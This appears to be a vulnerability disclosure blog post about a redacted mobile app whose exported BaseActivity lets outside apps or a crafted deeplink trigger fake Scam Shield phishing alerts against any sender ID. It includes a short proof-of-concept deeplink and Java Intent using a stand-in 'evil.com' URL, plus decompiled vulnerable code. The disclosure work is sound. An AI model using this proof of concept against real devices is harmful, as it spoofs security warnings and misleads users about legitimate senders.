---
date: "2025-12-22T12:17:51+08:00"
draft: false
title: "Scam Shield Logic Flaw Enables Phishing Alert Spoofing for Any Sender ID or Number"
summary: "A flaw in the Redacted app’s Scam Shield allows external Intents to trigger fake phishing alerts, letting malicious application or crafted deeplinks falsely flag legitimate sender IDs or phone numbers."

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---


## **Summary**
The Redacted application has an SMS Scam Shield feature that processes incoming SMS messages and generates phishing alerts. The exported BaseActivity accepts Intents from external applications to trigger phishing notifications without any input validation. As a result, a malicious web application hosting a crafted deeplink and an installed malicious application can exploit the behavior to display phishing alerts and flag legitimate sender IDs or numbers as phishing.

## **Impact**
An attacker can exploit this issue through both a browser and a malicious mobile application installed on the victim’s device to:
* A user visiting a malicious website with a crafted deeplink can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing.
* A malicious application can launch the phishing alert and falsely flag legitimate sender IDs and phone numbers as phishing.


## **Exploit**
To exploit this issue, the victim must visit a website hosting a crafted deeplink, and a malicious application must be installed on the victim’s device. See the HTML and Java code below:

**Malicious web application `.html`**
```html
<a href="redacted://new.redacted.com.ph/redactedpath?action=sms_phishing&phishing_url=https://nmochea.com&sms_body=Warning very bad, bad messages!&sender_id=+639123456789">
    Xploitz
</a>
```
**Malicious mobile application `.java`**
```java
Intent yeyyy = new Intent();
yeyyy.setClassName("ph.com.redacted", "ph.com.redacted.BaseActivity");
yeyyy.putExtra("sms_protect_notification", "CatcherFragment");
yeyyy.putExtra("phishing_url", "https://evil.com");
yeyyy.putExtra("phishing_sms_body", "Warning very bad, bad messages!");
yeyyy.putExtra("phishing_sender_id", "+639123456789");
startActivity(yeyyy);
```



## **Technical Details**
The exported `BaseActivity` automatically handles any incoming Intent through `onCreate()` and `onNewIntent()`. Both of these methods pass the Intent straight to `m55166H(intent)` **without checking or validating the input**, which means anything sent to this activity can be processed without restriction.

**In `BaseActivity()`:**
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    ...
    m55166H(getIntent());        // Processes launch Intent
    ...
}

@Override
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    m55166H(intent);             // Processes subsequent Intents
    ...
}
```

The `m55166H(Intent)` method is use to handle internal extras for redacted application SMS Scam Shield feature. However, it trusts every incoming Intent extra without any validation. Once the **sms_protect_notification** extra matches **CatcherFragment**, the method blindly reads the values you provide in **phishing_url**, **phishing_sms_body**, and **phishing_sender_id**, builds a deep link from them, and immediately executes it through `handleDeepLink()`.

**In `BaseActivity.m55166H(Intent intent)`:**
```java
BaseActivity baseActivity2 = this;
if (intent != null) {
  String stringExtra = intent.getStringExtra("sms_protect_notification");  // Controlled extra

  if (stringExtra != null) {
    if (stringExtra.equals("CatcherFragment")) {  // No validation before using input

      String stringExtra2 = intent.getStringExtra(BrazeConst.Properties.PHISHING_URL);   // Controlled data
      String stringExtra3 = intent.getStringExtra("phishing_sms_body");                  // Controlled data
      String stringExtra4 = intent.getStringExtra("phishing_sender_id");                 // Controlled data

      GeneralEventsViewModel generalEventsViewModelM55159A = m55159A();

      StringBuilder sbM60851j = AbstractC32857m.m60851j(
            "https://new.redacted.com.ph/redactedpath?action=sms_phishing&phishing_url=", 
             stringExtra2,          // Injected data
             "&sms_body=", 
             stringExtra3,          // Injected data
             "&sender_id="
      );
      sbM60851j.append(stringExtra4);  // Injected data

      Uri uri = Uri.parse(sbM60851j.toString());  // Parses built URL

      GeneralEventsViewModel.handleDeepLink$default(generalEventsViewModelM55159A, uri, null, 2, null); // Executes crafted deeplink
      return;
    }
    return;
  }
}
```